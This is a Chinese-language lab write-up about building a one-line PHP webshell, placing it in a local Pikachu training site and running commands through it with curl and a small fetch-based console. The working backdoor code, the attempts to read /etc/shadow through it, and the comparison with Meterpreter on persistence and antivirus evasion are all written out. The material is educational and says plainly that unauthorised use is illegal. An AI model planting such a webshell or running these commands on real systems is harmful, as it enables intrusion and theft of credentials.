## 第 1 站：一句话木马是怎么成立的

### 1.1 那 35 个字节

```php
<?php system($_REQUEST['cmd']); ?>
```

就这一行。拆开看：

```php
<?php system($_REQUEST['cmd']); ?>
 │     │      │                    │
 │     │      │                    └─ 语句结束
 │     │      └─ 从请求里取名为 cmd 的参数
 │     └─ 执行系统命令，把结果直接输出到页面
 └─ PHP 代码开始标记
```

**核心只有两个东西：**

| 组件 | 作用 | 缺了会怎样 |
|---|---|---|
| `$_REQUEST['cmd']` | **输入点**：接收用户传来的值 | 没有输入点 = 固定命令 |
| `system(...)` | **执行点**：把值当命令运行 | 没有执行点 = 只是一段字符串 |

**两个凑齐，一个普通 PHP 页面就变成了 WebShell。**

### 1.2 和你之前做的 SQL 注入是同一个结构

对照一下：

```php
// SQL 注入（皮卡丘 sqli_id.php）
$id = $_POST['id'];              // ← 输入点
$query = "select * from users where id=$id";  // ← 拼进 SQL
mysqli_query($link, $query);     // ← 执行点（执行 SQL）

// 一句话木马
$cmd = $_REQUEST['cmd'];         // ← 输入点
system($cmd);                    // ← 执行点（执行系统命令）
```

**结构一模一样：输入点 → 汇点。** 区别只在汇点执行的是什么：

```
SQL 注入：  用户数据 → 进了 SQL 解析器 → 执行的是数据库操作
一句话木马：用户数据 → 进了 shell → 执行的是系统命令
```

**所以"一句话木马"本质上是一个"故意的漏洞"**——它把「输入 → 执行」这条链主动暴露给你，是一个攻击者上传的后门。

### 1.3 为什么 `$_REQUEST` 而不是 `$_GET`

三个超全局变量的区别：

| 变量 | 接收方式 | 举例 |
|---|---|---|
| `$_GET` | URL 参数 | `?cmd=id` |
| `$_POST` | 请求体 | 表单提交 |
| `$_REQUEST` | **两者都收** | 上面两种都能用 |

木马里用 `$_REQUEST` 是为了**兼容性**——用浏览器地址栏能打，用工具 POST 也能打。

**「连接密码」这个词的来历就在这里**：工具（蚁剑、菜刀）问你"连接密码是多少"，问的其实是 **`$_REQUEST['cmd']` 里的 `cmd` 这个参数名**。

```
木马：<?php system($_REQUEST['cmd']); ?>
                                ↑
                          这里填的 "cmd" 就是"密码"

URL：  .../shell.php            ← 这个只是"地址"
```

**填错就永远连不上**：填 `shell` 不行，填 `system` 不行，只能填 `cmd`。

## 第 2 站：把它放进网站目录

### 2.1 先确认靶场在哪

一开始我以为 Pikachu 在 Metasploitable 上（上一篇的靶机 `.129`），访问：

```bash
curl -I http://192.168.23.129/pikachu/
```

```
HTTP/1.1 404 Not Found
Server: Apache/2.2.8 (Ubuntu) DAV/2
```

**这个 404 很有信息量**：

```
Server: Apache/2.2.8    → 服务器在，Apache 正常跑着
404 Not Found           → 但 /pikachu/ 这个路径不存在
```

**不是网络问题，是路径问题。** 再试本机：

```bash
curl -s -o /dev/null -w "%{http_code}\n" http://127.0.0.1/pikachu/
```

```
200
```

**200 —— Pikachu 在我这台 Kali 上。**

### 2.2 一个 404 能说明多少事

这种排查方式值得单独讲，因为它把"猜"变成了"读信号"：

| 你看到的 | 含义 | 该查什么 |
|---|---|---|
| `ping` 100% 丢包 | 可能只是 ICMP 被拦 | 别急着下结论 |
| `Connection refused` | 端口没服务 | 服务没起 |
| `Connection timed out` | 包被丢或路由不通 | 防火墙/网段 |
| **`Server: xxx` + `404`** | **服务器活着，路径不对** | 换路径，别查网络 |

**`404` 和 `timeout` 是两种完全不同的排查方向**：前者是"我到了，你要的东西不存在"，后者是"我压根没到"。

### 2.3 写文件

在 Kali 上：

```bash
cat > ~/shell.php << 'EOF'
<?php system($_REQUEST['cmd']); ?>
EOF
```

**这个写法有个必须注意的细节**：`<< 'EOF'` 的**单引号**不能省。

```
<<  EOF     ← $ 会被 shell 展开，$_REQUEST 变成空 → 写进去的是坏文件
<< 'EOF'    ← 单引号阻止展开 → 原样写入
```

因为 `$_REQUEST` 里有 `$`，不加引号就成了"展开一个不存在的变量"，写进文件的会变成：

```php
<?php system(['cmd']); ?>     ← 坏了
```

验证：

```bash
cat ~/shell.php
```

必须一字不差：

```
<?php system($_REQUEST['cmd']); ?>
```

### 2.4 放进网站目录

```bash
sudo cp ~/shell.php /var/www/html/pikachu/
```

Kali 的 Apache 根目录是 `/var/www/html/`，Pikachu 在它下面。

## 第 3 站：验证 —— 先 curl，再谈工具

### 3.1 为什么必须先 curl

```
curl -s "http://127.0.0.1/pikachu/shell.php?cmd=id"
```

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**这一行就是"木马成立"的唯一证据。**

**为什么不用浏览器？** 两个原因：

1. 浏览器会把 `?cmd=id` 显示成 URL，输出混在页面里，截图时不容易看出"哪些是执行结果"；
2. 上次做 XSS 时，Edge 的自动翻译往 DOM 里插了一堆 `<font _mst...>`，把页面结构搅乱了。

**`curl` 的输出是纯文本，有没有执行、执行了什么，一眼就清楚。**

![curl 拿到 uid](/img/rc2-05-curl-uid.png)

### 3.2 这一步的顺序不能反

```
正确：
  写木马 → 验证能执行 → 再上工具

错误：
  写木马 → 直接上工具 → 工具连不上 → 不知道是木马有问题还是工具配错了
```

**这是排查问题的基本原则：先把最底层的那一段单独验证。**

如果 `curl` 都跑不通，工具一定跑不通；如果 `curl` 通了但工具不通，问题就在工具（地址、密码、编码）。

## 第 4 站：拿到 shell 之后，第一件事就失败了

### 4.1 试读 shadow

拿到 `www-data` 权限后的第一个想法：**能不能读密码哈希？**

```
cat /etc/shadow
```

返回：**空白**。

**空白不是"读到了空文件"，而是"错误信息被吃掉了"。**

### 4.2 为什么是空白

`system()` 只把**标准输出（stdout）**返回给页面，**标准错误（stderr）被丢弃**：

```
cat /etc/shadow
  → stdout: （空，因为读被拒绝）
  → stderr: "cat: /etc/shadow: Permission denied"
                                ↑
                      这一段被 system() 扔掉了 → 页面空白
```

**修法是加 `2>&1`**（把标准错误重定向到标准输出）：

```
cat /etc/shadow 2>&1
```

```
cat: /etc/shadow: Permission denied
```

![shadow 被拒绝](/img/rc2-08-shadow-denied.png)

### 4.3 把"拒绝"的原因也拿出来

光看到 `Permission denied` 还不够——**得知道为什么被拒**：

```
ls -l /etc/shadow 2>&1
```

```
-rw-r----- 1 root shadow 1464 Jun 16 10:30 /etc/shadow
```

```
id
```

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**三条信息拼在一起，就是一个完整判断：**

| 证据 | 说明 |
|---|---|
| `-rw-r-----` | 属主 `root` 可读写，组 `shadow` 可读，**其他人没有权限** |
| `uid=33(www-data)` | 我是 `www-data`，既不是 root、也不在 shadow 组 |
| `Permission denied` | 所以读不到 |

**"读不到"是有明确原因的，不是"运气不好"。** 这就是技术结论和"我试了不行"的区别。

### 4.4 但有个反例：shell.php 属主是 root，却能执行

看目录列表：

```
-rw-r--r--  1 root root   35 Nov  9 09:37 shell.php
```

![目录列表与 shell.php](/img/rc2-07-ls-shell.png)

**属主是 `root`**（因为 `sudo cp` 复制的），我是 `www-data`，**为什么还能执行？**

看权限位：

```
-  rw-  r--  r--
   ↑    ↑    ↑
 属主   组   其他人
 root  root
```

**「其他人」有 `r--`（可读）。**

而 PHP 文件**只要能读就能被执行**——`www-data` 把它当普通文件读进内存，交给 PHP 解释器。**不需要"执行"权限（`x`）。**

> **文件不归你，权限不归你，但只要能被读取，就能被利用。** 这句话可以概括 WebShell 的全部前提。

## 第 5 站：工具为什么不是重点

### 5.1 一个耗了一小时的弯路

作业要求「利用蚁剑连接」。我在这上面花了将近一小时：

| 尝试 | 结果 |
|---|---|
| Kali 上下载 AntSword-Loader | GitHub 卡在 `awaiting response` |
| 换 `gh-proxy.com` 代理 | ✅ 下载成功（71 MB，9.8 秒） |
| 启动 | 要求选 workdir |
| 选了 `~/antsword_workdir` | 白屏 |
| 检查目录 | **空的，初始化根本没执行** |
| 转 Windows 版 | 下载 60 MB 成功 |
| 解压运行 | `代码解压出错：[object Object]` |
| 发现源码包不完整 | 缺 `package.json`、`source/`、`static/` |
| 补全源码 | 仍然白屏或报错 |

**最后确认：AntSword-Loader 4.0.3 在这两个环境里都无法完成初始化。**

### 5.2 但工具到底提供了什么

拆开看，蚁剑这类工具做的事和 `curl` **完全一样**：

```
蚁剑：你点一下"列出目录"
        → 拿 URL 拼 ?cmd=ls -la
        → 发请求
        → 把返回的文本显示在界面上

curl：你手打 curl "...?cmd=ls -la"
        → 发请求
        → 把返回的文本打印在终端
```

**唯一差别是"谁拼 URL"和"结果怎么显示"。** 没有功能上的增加。

它真正省的是**打字**：

| 蚁剑的功能 | 底层命令 |
|---|---|
| 文件管理器 | `ls` / `cat` / `rm` / `mv` |
| 虚拟终端 | 直接执行命令 |
| 上传下载 | `curl -F` / `base64` 编码传输 |
| 数据库管理 | 调 PHP 的 `mysqli` 函数 |

### 5.3 所以最后用了一个 3 KB 的替代页面

既然工具的本质就是"拼 URL + 显示结果"，那写个小页面就够了：

| 功能 | 实现 |
|---|---|
| 连接测试 | 发 `?cmd=id`，看返回值含不含 `uid=` |
| 命令执行 | 输入框 → `fetch(url + '?cmd=' + 命令)` |
| 快捷按钮 | 一排预设命令 |

![控制台连接](/img/rc2-06-console.png)

**关键设计**：这个页面必须和 `shell.php` **放在同一个目录**：

```
/var/www/html/pikachu/console.html   ← 页面
/var/www/html/pikachu/shell.php      ← 木马
```

因为浏览器有**同源策略**：页面向不同源的地址发 `fetch` 请求会被拦。放在同一个目录下，就是同源，不受限制。

**如果放到 Windows 上用浏览器打开，就会失败**——Windows 上的 `file://` 或 `192.168.23.1` 和 `192.168.23.128` 不同源。

### 5.4 什么时候该停下来换方案

这次的经验值得单独提炼：

```
同一个工具连续试了 5 种方式都不行
  → 不是"再试一次就好了"
  → 是"这个环境里这个工具就是不work"
```

**判断依据**：每次失败的**原因都不一样**（下载失败 → 白屏 → 报解压错 → 源码残缺），说明是环境问题，不是操作问题。**如果失败原因一直是同一个，那才值得继续调。**

更实际的判断：**作业要求的是"控制目标网站"，不是"必须用蚁剑"。** 当工具本身成为障碍，而目标已经能用别的方式达成时，换方案比硬磕更合理。

（写报告时我把这一条写清了：用了等效替代方案，原因是 Loader 4.0.3 在 Kali 和 Windows 环境下均无法完成初始化。）

## 附录

### A.1 命令速查

| 目的 | 命令 |
|---|---|
| 写木马 | `cat > ~/shell.php << 'EOF'` … `EOF` |
| 放进网站目录 | `sudo cp ~/shell.php /var/www/html/pikachu/` |
| 验证执行 | `curl -s "http://127.0.0.1/pikachu/shell.php?cmd=id"` |
| 带空格命令 | `curl -s "...shell.php?cmd=uname%20-a"` |
| 让错误可见 | `...?cmd=cat%20/etc/shadow%202%3E%261` |
| 删木马 | `sudo rm /var/www/html/pikachu/shell.php` |

### A.2 URL 编码速查

命令要放进 URL，空格等字符必须编码：

| 字符 | 编码 | 例子 |
|---|---|---|
| 空格 | `%20` | `uname -a` → `uname%20-a` |
| `>` | `%3E` | `2>&1` → `2%3E%261` |
| `&` | `%26` | 同上 |
| `#` | `%23` | — |

**用 `curl` 时其实可以省掉手编码**：`--data-urlencode` 参数会自动处理，或者直接用 `-G --data-urlencode "cmd=uname -a"`。

### A.3 这次踩的坑

| 坑 | 现象 | 根因 | 解法 |
|---|---|---|---|
| 1 | `192.168.23.129/pikachu/` 返回 404 | Pikachu 在 Kali 本机，不在靶机 | 用 `127.0.0.1` |
| 2 | 写出来的 `shell.php` 是坏的 | `<< EOF` 没加单引号，`$` 被展开 | `<< 'EOF'` |
| 3 | `cat /etc/shadow` 返回空白 | stderr 被 `system()` 丢弃 | 加 `2>&1` |
| 4 | 蚁剑初始化失败（多个原因叠加） | Loader 4.0.3 + 国内网络 + 源码包不完整 | 改用等效页面 |

### A.4 权限对比：WebShell vs Meterpreter

| | WebShell（本篇） | Meterpreter（上篇） |
|---|---|---|
| 需要目标做什么 | **上传一个文件** | **运行一个 exe** |
| 权限来源 | Apache 运行用户（`www-data`） | 运行 exe 的用户（管理员） |
| 能读 `/etc/shadow` | ❌ | ✅（如果是 root） |
| 持续性 | **文件在就在**，重启也在 | **进程一死就断**，重启没了 |
| 被杀软检测 | 低（PHP 文本，特征少） | **高（11/28）** |
| 典型场景 | Web 权限维持 | 拿到 shell 后的深入 |

**这张表解释了为什么两种都要学**：

- WebShell 好上传、难检测，但权限低、只能在 Web 目录活动；
- Meterpreter 权限高、功能全，但落地就被杀、进程一死就断。

**真实渗透里两者是配合用的**：先用 WebShell 稳住一个入口，再想办法提权、找机会上 Meterpreter。

### A.5 边界

这篇讲的是"往网站扔后门"。**边界必须说清：**

| 情形 | 性质 |
|---|---|
| 自己的靶场（Pikachu） | **合法**，学习 |
| 授权测试，范围写清的 | **合法** |
| 没有授权，往任何网站传 PHP 文件 | **违法**（非法侵入 + 破坏计算机信息系统） |

**"只是想试试能不能传上去"也是违法。** 上传成功与否不影响定性——**尝试本身**就构成要件。

我自己的规矩：**只在 `127.0.0.1` 和 `192.168.23.0/24` 里动手。**

### A.6 两篇的关系

```
远程控制
  ├─ 一：作一个 exe → 送进去 → 运行 → Meterpreter 会话
  │        特点：权限高、功能全、但极易被杀
  │
  └─ 二：写一个 PHP → 放进网站目录 → 访问 → 命令执行
           特点：好上传、难检测、但权限低

共同点：都是"在目标上留下能让外部执行代码的东西"
共同边界：只在授权范围内
```
